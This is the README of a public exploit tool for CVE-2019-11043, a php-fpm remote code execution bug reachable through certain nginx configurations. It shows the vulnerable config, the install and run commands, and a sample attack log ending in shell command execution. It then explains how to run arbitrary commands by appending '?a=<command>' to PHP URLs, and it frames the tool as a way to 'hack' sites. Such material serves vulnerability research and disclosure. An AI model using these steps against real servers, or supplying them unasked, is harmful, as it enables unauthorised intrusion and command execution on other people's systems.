# PHuiP-FPizdaM

## What's this

This is an exploit for a bug in php-fpm (CVE-2019-11043). In certain nginx + php-fpm configurations, the bug is possible to trigger from the outside. That means that a web user may get code execution if you have vulnerable config (see below).

## What's vulnerable

If you have a site using nginx + php-fpm and nginx have a configuration like

```
location ~ [^/]\.php(/|$) {
  ...
  fastcgi_split_path_info ^(.+?\.php)(/.*)$;
  fastcgi_param PATH_INFO       $fastcgi_path_info;
  fastcgi_pass   php:9000;
  ...
}
```

which also lucks any script existence checks then you can probably hack it with this sploit.

## Isn't this known to be vulnerable for years?

Back in the ages, php-fpm didn't restrict the extensions of the scripts, meaning that something like `/avatar.png/some-fake-shit.php` could execute `avatar.png` as a PHP script. This issue was fixed long ago.

This one doesn't require file upload, works in most recent versions (until the fix has landed) and, most importantly, the exploit is much cooler.

## How to run

Install it using
```
go install github.com/neex/phuip-fpizdam
```

and try to run using `phuip-fpizdam [url]`. Good output looks like this:

```
2019/10/01 02:46:15 Base status code is 200
2019/10/01 02:46:15 Status code 500 for qsl=1745, adding as a candidate
2019/10/01 02:46:15 The target is probably vulnerable. Possible QSLs: [1735 1740 1745]
2019/10/01 02:46:16 Attack params found: --qsl 1735 --pisos 126 --skip-detect
2019/10/01 02:46:16 Trying to set "session.auto_start=0"...
2019/10/01 02:46:16 Detect() returned attack params: --qsl 1735 --pisos 126 --skip-detect <-- REMEMBER THIS
2019/10/01 02:46:16 Performing attack using php.ini settings...
2019/10/01 02:46:40 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
2019/10/01 02:46:40 Trying to cleanup /tmp/a...
2019/10/01 02:46:40 Done!
```

After this, you can start appending `?a=<your command>` to all PHP scripts (you may need multiple retries).

## Credits

Original anomaly discovered by (d90pwn)[https://github.com/d90pwn] during Real World CTF. Root clause found by me (Emil Lerner) as well as the way to set php.ini options. Final php.ini options set is found by (beched)[mailto:beched@deteact.com].
